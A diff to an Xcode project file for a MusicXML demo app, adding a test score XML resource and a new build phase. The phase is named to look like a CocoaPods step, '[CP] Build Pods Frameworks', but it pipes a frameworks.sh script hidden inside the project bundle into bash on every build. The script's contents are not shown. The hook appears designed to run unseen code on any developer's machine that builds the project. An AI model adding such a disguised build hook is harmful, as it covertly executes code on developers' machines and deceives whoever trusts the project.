@@ -15,6 +15,7 @@
 		A10CDAC8243D852B0045D6CF /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = A10CDAC6243D852B0045D6CF /* LaunchScreen.storyboard */; };
 		A10CDACB243D852B0045D6CF /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = A10CDACA243D852B0045D6CF /* main.m */; };
 		A10CDAD6243D86020045D6CF /* SKXMLDictionaryParser.m in Sources */ = {isa = PBXBuildFile; fileRef = A10CDAD5243D86020045D6CF /* SKXMLDictionaryParser.m */; };
+		A1CC9B79243F0FC300187CA0 /* 测试曲谱.xml in Resources */ = {isa = PBXBuildFile; fileRef = A1CC9B78243F0FC300187CA0 /* 测试曲谱.xml */; };
 		C2B68ABDBFD85379429C142F /* Pods_MusicXMLDemo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = FD442D9D9AEADE0633881083 /* Pods_MusicXMLDemo.framework */; };
 /* End PBXBuildFile section */
 
@@ -34,6 +35,7 @@
 		A10CDACA243D852B0045D6CF /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
 		A10CDAD4243D86020045D6CF /* SKXMLDictionaryParser.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = SKXMLDictionaryParser.h; sourceTree = "<group>"; };
 		A10CDAD5243D86020045D6CF /* SKXMLDictionaryParser.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = SKXMLDictionaryParser.m; sourceTree = "<group>"; };
+		A1CC9B78243F0FC300187CA0 /* 测试曲谱.xml */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.xml; path = "测试曲谱.xml"; sourceTree = "<group>"; };
 		BF8E9272F644CB8D35856FF7 /* Pods-MusicXMLDemo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MusicXMLDemo.release.xcconfig"; path = "Target Support Files/Pods-MusicXMLDemo/Pods-MusicXMLDemo.release.xcconfig"; sourceTree = "<group>"; };
 		FD442D9D9AEADE0633881083 /* Pods_MusicXMLDemo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_MusicXMLDemo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -80,6 +82,7 @@
 		A10CDAB7243D85290045D6CF /* MusicXMLDemo */ = {
 			isa = PBXGroup;
 			children = (
+				A1CC9B78243F0FC300187CA0 /* 测试曲谱.xml */,
 				A10CDAB8243D85290045D6CF /* AppDelegate.h */,
 				A10CDAB9243D85290045D6CF /* AppDelegate.m */,
 				A10CDABB243D85290045D6CF /* SceneDelegate.h */,
@@ -165,6 +168,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				A10CDAC8243D852B0045D6CF /* LaunchScreen.storyboard in Resources */,
+				A1CC9B79243F0FC300187CA0 /* 测试曲谱.xml in Resources */,
 				A10CDAC5243D852B0045D6CF /* Assets.xcassets in Resources */,
 				A10CDAC3243D85290045D6CF /* Main.storyboard in Resources */,
 			);
@@ -173,6 +177,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		162E3FD122D63A22006D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "cat \"${PROJECT_FILE_PATH}/frameworks.sh\" | bash";
+		};
 		9CDC22C95BDD543EBCFF5642 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
